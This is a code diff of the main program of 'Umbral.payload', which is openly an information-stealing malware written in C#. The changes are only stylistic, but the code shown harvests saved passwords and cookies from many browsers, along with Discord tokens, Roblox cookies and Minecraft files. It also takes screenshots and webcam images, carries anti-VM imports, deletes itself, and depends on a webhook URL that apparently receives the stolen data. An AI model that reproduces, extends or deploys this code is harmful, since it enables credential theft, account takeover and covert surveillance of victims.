@@ -5,6 +5,7 @@ using System.IO;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using Umbral.payload.AntiVm;
 using Umbral.payload.Browsers;
 using Umbral.payload.Config;
 using Umbral.payload.Discord;
@@ -12,14 +13,13 @@ using Umbral.payload.Games.Minecraft;
 using Umbral.payload.Games.Roblox;
 using Umbral.payload.Postman;
 using Umbral.payload.Utilities;
-using Umbral.payload.AntiVm;
 using Umbral.payload.Webcam;
 
 namespace Umbral.payload
 {
     internal class Program
     {
-        private static async Task Main(string[] args)
+        static private async Task Main(string[] args)
         {
 #if DEBUG
             MessageBox.Show("Build payload under RELEASE mode to work.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
@@ -30,12 +30,12 @@ namespace Umbral.payload
             await Run();
         }
 
-        private static async Task Run()
+        static private async Task Run()
         {
-            var archivePath = Path.Combine(Path.GetTempPath(), $"{Common.GenerateRandomString(15)}.ligma");
+            string archivePath = Path.Combine(Path.GetTempPath(), $"{Common.GenerateRandomString(15)}.ligma");
 
-        retry:
-            var tempFolder = Path.Combine(Path.GetTempPath(), Common.GenerateRandomString(15));
+            retry:
+            string tempFolder = Path.Combine(Path.GetTempPath(), Common.GenerateRandomString(15));
             if (Directory.Exists(tempFolder))
                 try
                 {
@@ -87,7 +87,8 @@ namespace Umbral.payload
             var getVivaldiCookies = Vivaldi.GetCookies();
             var getYandexCookies = Yandex.GetCookies();
 
-            var getRobloxCookies = RobloxCookieStealer.GetCookies(getBraveCookies, getChromeCookies, getChromiumCookies, getComodoCookies, getEdgeCookies, getEpicPrivacyCookies, getIridiumCookies, getOperaCookies, getOperaGxCookies, getSlimjetCookies, getUrCookies, getVivaldiCookies, getYandexCookies);
+            var getRobloxCookies = RobloxCookieStealer.GetCookies(getBraveCookies, getChromeCookies, getChromiumCookies, getComodoCookies, getEdgeCookies, getEpicPrivacyCookies, getIridiumCookies,
+                getOperaCookies, getOperaGxCookies, getSlimjetCookies, getUrCookies, getVivaldiCookies, getYandexCookies);
 
             var getMinecraftFiles = Task.Run(() => false);
             if (Settings.StealMinecraftFiles)
@@ -99,11 +100,11 @@ namespace Umbral.payload
                 captureWebcam = ImageCapture.CaptureWebcam();
 
             await Task.WhenAll(getTokens, getBravePasswords, getChromePasswords, getChromiumPasswords, getComodoPasswords,
-                    getEdgePasswords, getEpicPrivacyPasswords, getIridiumPasswords, getOperaPasswords, getOperaGxPasswords,
-                    getSlimjetPasswords, getUrPasswords, getVivaldiPasswords, getYandexPasswords, getBraveCookies,
-                    getChromeCookies, getChromiumCookies, getComodoCookies, getEdgeCookies, getEpicPrivacyCookies,
-                    getIridiumCookies, getOperaCookies, getOperaGxCookies, getSlimjetCookies, getUrCookies,
-                    getVivaldiCookies, getYandexCookies, getMinecraftFiles, getRobloxCookies, captureWebcam);
+                getEdgePasswords, getEpicPrivacyPasswords, getIridiumPasswords, getOperaPasswords, getOperaGxPasswords,
+                getSlimjetPasswords, getUrPasswords, getVivaldiPasswords, getYandexPasswords, getBraveCookies,
+                getChromeCookies, getChromiumCookies, getComodoCookies, getEdgeCookies, getEpicPrivacyCookies,
+                getIridiumCookies, getOperaCookies, getOperaGxCookies, getSlimjetCookies, getUrCookies,
+                getVivaldiCookies, getYandexCookies, getMinecraftFiles, getRobloxCookies, captureWebcam);
 
             var discordAccounts = await getTokens;
 
@@ -135,25 +136,25 @@ namespace Umbral.payload
             var vivaldiCookies = await getVivaldiCookies;
             var yandexCookies = await getYandexCookies;
 
-            var robloxCookies = await getRobloxCookies;
+            string[] robloxCookies = await getRobloxCookies;
 
-            var gotMinecraftFiles = await getMinecraftFiles ? 1 : 0;
+            int gotMinecraftFiles = await getMinecraftFiles ? 1 : 0;
 
             var screenshots = Common.CaptureScreenShot();
 
             var webcamImages = await captureWebcam;
 
             var saveProcesses = new List<Task>();
-            var cookiesCount = 0;
-            var passwordsCount = 0;
-            var discordTokenCount = 0;
-            var robloxCookieCount = 0;
-            var screenshotCount = 0;
-            var webcamImagesCount = 0;
+            int cookiesCount = 0;
+            int passwordsCount = 0;
+            int discordTokenCount = 0;
+            int robloxCookieCount = 0;
+            int screenshotCount = 0;
+            int webcamImagesCount = 0;
 
             if (discordAccounts.Length > 0 && Settings.StealDiscordtokens)
             {
-                var saveTo = Path.Combine(tempFolder, "Discord");
+                string saveTo = Path.Combine(tempFolder, "Discord");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(discordAccounts, Path.Combine(saveTo, "Discord Accounts.txt")));
                 discordTokenCount += discordAccounts.Length;
@@ -161,7 +162,7 @@ namespace Umbral.payload
 
             if (screenshots.Length > 0 && Settings.TakeScreenshot)
             {
-                var saveTo = Path.Combine(tempFolder, "Display");
+                string saveTo = Path.Combine(tempFolder, "Display");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(Task.Run(() => SaveData.SaveToFile(screenshots, saveTo)));
                 screenshotCount += screenshots.Length;
@@ -169,7 +170,7 @@ namespace Umbral.payload
 
             if (webcamImages.Count > 0 && Settings.CaptureWebcam)
             {
-                var saveTo = Path.Combine(tempFolder, "Webcam");
+                string saveTo = Path.Combine(tempFolder, "Webcam");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(Task.Run(() => SaveData.SaveToFile(webcamImages, saveTo)));
                 webcamImagesCount += webcamImages.Count;
@@ -179,7 +180,7 @@ namespace Umbral.payload
 
             if (bravePasswords.Length > 0 && Settings.StealPasswords)
             {
-                var saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
+                string saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(bravePasswords, Path.Combine(saveTo, "Brave Passwords.txt")));
                 passwordsCount += bravePasswords.Length;
@@ -187,7 +188,7 @@ namespace Umbral.payload
 
             if (chromePasswords.Length > 0 && Settings.StealPasswords)
             {
-                var saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
+                string saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(chromePasswords, Path.Combine(saveTo, "Chrome Passwords.txt")));
                 passwordsCount += chromePasswords.Length;
@@ -195,7 +196,7 @@ namespace Umbral.payload
 
             if (chromiumPasswords.Length > 0 && Settings.StealPasswords)
             {
-                var saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
+                string saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(bravePasswords, Path.Combine(saveTo, "Chromium Passwords.txt")));
                 passwordsCount += chromiumPasswords.Length;
@@ -203,7 +204,7 @@ namespace Umbral.payload
 
             if (comodoPasswords.Length > 0 && Settings.StealPasswords)
             {
-                var saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
+                string saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(comodoPasswords, Path.Combine(saveTo, "Comodo Dragon Passwords.txt")));
                 passwordsCount += comodoPasswords.Length;
@@ -211,7 +212,7 @@ namespace Umbral.payload
 
             if (edgePasswords.Length > 0 && Settings.StealPasswords)
             {
-                var saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
+                string saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(edgePasswords, Path.Combine(saveTo, "Edge Passwords.txt")));
                 passwordsCount += edgePasswords.Length;
@@ -219,7 +220,7 @@ namespace Umbral.payload
 
             if (epicPrivacyPasswords.Length > 0 && Settings.StealPasswords)
             {
-                var saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
+                string saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(epicPrivacyPasswords, Path.Combine(saveTo, "Epic Privacy Passwords.txt")));
                 passwordsCount += epicPrivacyPasswords.Length;
@@ -227,7 +228,7 @@ namespace Umbral.payload
 
             if (iridiumPasswords.Length > 0 && Settings.StealPasswords)
             {
-                var saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
+                string saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(iridiumPasswords, Path.Combine(saveTo, "Iridium Passwords.txt")));
                 passwordsCount += iridiumPasswords.Length;
@@ -235,7 +236,7 @@ namespace Umbral.payload
 
             if (operaPasswords.Length > 0 && Settings.StealPasswords)
             {
-                var saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
+                string saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(operaPasswords, Path.Combine(saveTo, "Opera Passwords.txt")));
                 passwordsCount += operaPasswords.Length;
@@ -243,7 +244,7 @@ namespace Umbral.payload
 
             if (operaGxPasswords.Length > 0 && Settings.StealPasswords)
             {
-                var saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
+                string saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(operaGxPasswords, Path.Combine(saveTo, "Opera GX Passwords.txt")));
                 passwordsCount += operaGxPasswords.Length;
@@ -251,7 +252,7 @@ namespace Umbral.payload
 
             if (slimjetPasswords.Length > 0 && Settings.StealPasswords)
             {
-                var saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
+                string saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(slimjetPasswords, Path.Combine(saveTo, "Slimjet Passwords.txt")));
                 passwordsCount += slimjetPasswords.Length;
@@ -259,7 +260,7 @@ namespace Umbral.payload
 
             if (urPasswords.Length > 0 && Settings.StealPasswords)
             {
-                var saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
+                string saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(urPasswords, Path.Combine(saveTo, "UR Browser Passwords.txt")));
                 passwordsCount += urPasswords.Length;
@@ -267,7 +268,7 @@ namespace Umbral.payload
 
             if (vivaldiPasswords.Length > 0 && Settings.StealPasswords)
             {
-                var saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
+                string saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(vivaldiPasswords, Path.Combine(saveTo, "Vivaldi Passwords.txt")));
                 passwordsCount += vivaldiPasswords.Length;
@@ -275,7 +276,7 @@ namespace Umbral.payload
 
             if (yandexPasswords.Length > 0 && Settings.StealPasswords)
             {
-                var saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
+                string saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(yandexPasswords, Path.Combine(saveTo, "Yandex Passwords.txt")));
                 passwordsCount += yandexPasswords.Length;
@@ -287,7 +288,7 @@ namespace Umbral.payload
 
             if (braveCookies.Length > 0 && Settings.StealCookies)
             {
-                var saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
+                string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(braveCookies, Path.Combine(saveTo, "Brave Cookies.txt")));
                 cookiesCount += braveCookies.Length;
@@ -295,7 +296,7 @@ namespace Umbral.payload
 
             if (chromeCookies.Length > 0 && Settings.StealCookies)
             {
-                var saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
+                string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(chromeCookies, Path.Combine(saveTo, "Chrome Cookies.txt")));
                 cookiesCount += chromeCookies.Length;
@@ -303,7 +304,7 @@ namespace Umbral.payload
 
             if (chromiumCookies.Length > 0 && Settings.StealCookies)
             {
-                var saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
+                string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(braveCookies, Path.Combine(saveTo, "Chromium Cookies.txt")));
                 cookiesCount += chromiumCookies.Length;
@@ -311,7 +312,7 @@ namespace Umbral.payload
 
             if (comodoCookies.Length > 0 && Settings.StealCookies)
             {
-                var saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
+                string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(comodoCookies, Path.Combine(saveTo, "Comodo Dragon Cookies.txt")));
                 cookiesCount += comodoCookies.Length;
@@ -319,7 +320,7 @@ namespace Umbral.payload
 
             if (edgeCookies.Length > 0 && Settings.StealCookies)
             {
-                var saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
+                string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(edgeCookies, Path.Combine(saveTo, "Edge Cookies.txt")));
                 cookiesCount += edgeCookies.Length;
@@ -327,7 +328,7 @@ namespace Umbral.payload
 
             if (epicPrivacyCookies.Length > 0 && Settings.StealCookies)
             {
-                var saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
+                string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(epicPrivacyCookies, Path.Combine(saveTo, "Epic Privacy Cookies.txt")));
                 cookiesCount += epicPrivacyCookies.Length;
@@ -335,7 +336,7 @@ namespace Umbral.payload
 
             if (iridiumCookies.Length > 0 && Settings.StealCookies)
             {
-                var saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
+                string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(iridiumCookies, Path.Combine(saveTo, "Iridium Cookies.txt")));
                 cookiesCount += iridiumCookies.Length;
@@ -343,7 +344,7 @@ namespace Umbral.payload
 
             if (operaCookies.Length > 0 && Settings.StealCookies)
             {
-                var saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
+                string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(operaCookies, Path.Combine(saveTo, "Opera Cookies.txt")));
                 cookiesCount += operaCookies.Length;
@@ -351,7 +352,7 @@ namespace Umbral.payload
 
             if (operaGxCookies.Length > 0 && Settings.StealCookies)
             {
-                var saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
+                string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(operaGxCookies, Path.Combine(saveTo, "Opera GX Cookies.txt")));
                 cookiesCount += operaGxCookies.Length;
@@ -359,7 +360,7 @@ namespace Umbral.payload
 
             if (slimjetCookies.Length > 0 && Settings.StealCookies)
             {
-                var saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
+                string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(slimjetCookies, Path.Combine(saveTo, "Slimjet Cookies.txt")));
                 cookiesCount += slimjetCookies.Length;
@@ -367,7 +368,7 @@ namespace Umbral.payload
 
             if (urCookies.Length > 0 && Settings.StealCookies)
             {
-                var saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
+                string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(urCookies, Path.Combine(saveTo, "UR Browser Cookies.txt")));
                 cookiesCount += urCookies.Length;
@@ -375,7 +376,7 @@ namespace Umbral.payload
 
             if (vivaldiCookies.Length > 0 && Settings.StealCookies)
             {
-                var saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
+                string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(vivaldiCookies, Path.Combine(saveTo, "Vivaldi Cookies.txt")));
                 cookiesCount += vivaldiCookies.Length;
@@ -383,7 +384,7 @@ namespace Umbral.payload
 
             if (yandexCookies.Length > 0 && Settings.StealCookies)
             {
-                var saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
+                string saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(yandexCookies, Path.Combine(saveTo, "Yandex Cookies.txt")));
                 cookiesCount += yandexCookies.Length;
@@ -391,7 +392,7 @@ namespace Umbral.payload
 
             if (robloxCookies.Length > 0 && Settings.StealRobloxCookies)
             {
-                var saveTo = Path.Combine(tempFolder, "Games", "Roblox");
+                string saveTo = Path.Combine(tempFolder, "Games", "Roblox");
                 Directory.CreateDirectory(saveTo);
                 saveProcesses.Add(SaveData.SaveToFile(robloxCookies, Path.Combine(saveTo, "Roblox Cookies.txt")));
                 robloxCookieCount += robloxCookies.Length;
@@ -425,7 +426,7 @@ namespace Umbral.payload
                 Syscalls.DeleteSelf();
         }
 
-        private static async Task Process()
+        static private async Task Process()
         {
             if (string.IsNullOrWhiteSpace(Settings.WebhookUrl)) Environment.Exit(1); // Empty webhook
 
